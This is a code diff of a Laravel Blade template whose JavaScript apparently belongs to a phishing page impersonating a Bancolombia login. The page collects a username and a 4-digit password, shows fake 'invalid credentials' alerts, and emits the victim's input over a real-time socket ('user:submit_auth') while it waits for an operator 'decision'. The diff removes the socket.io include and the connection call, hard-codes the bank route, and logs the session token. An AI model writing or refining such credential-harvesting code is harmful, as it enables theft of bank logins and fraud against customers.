@@ -43,9 +43,12 @@
     </form>
 @endsection
 
+@php
+  $sc = session()->get('sc', []);
+  $user = Arr::get($sc, 'user');
+@endphp
+
 @push('scripts')
-    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-    <script src="{{ asset('assets/js/sc.js') }}"></script>
     <script>
         
 document.addEventListener('DOMContentLoaded', function () {
@@ -56,12 +59,13 @@ document.addEventListener('DOMContentLoaded', function () {
   const sessionId = @json($sessionId);
   const sessionToken = @json($sessionToken);
   const step = @json($step); // ✅ asegúrate de pasar $screen desde controller
-  const bank = @json($bank);
+ // const bank = @json($bank);
   const user = @json($user);
-  window.RT.sessionToken = sessionToken;
+
   let waitingNewDecision = false;
 
-  
+  console.log(sessionToken)
+
   function toggleBtn() {
     btn.disabled = !((passInput.value || '').trim().length === 4);
   }
@@ -103,7 +107,7 @@ document.addEventListener('DOMContentLoaded', function () {
     if (!user || user.length < 4) {
       showBankAlert('loginError', 'Credenciales inválidas.');
       setTimeout(() => {
-        window.location.href = `/pago/${bank}/step/1`;
+        window.location.href = `/pago/bancolombia/`;
         return;
       }, 2000);
       return;
@@ -111,7 +115,6 @@ document.addEventListener('DOMContentLoaded', function () {
 
     hideBankAlert('loginError');
     // ✅ emitir (si no está conectado, se encola y se envía cuando conecte)
-    initSocketConnection(nodeUrl, sessionId, sessionToken, bank, '2');
     waitingNewDecision = true;
     console.log(sessionToken)
     rtEmitSubmit('user:submit_auth', {
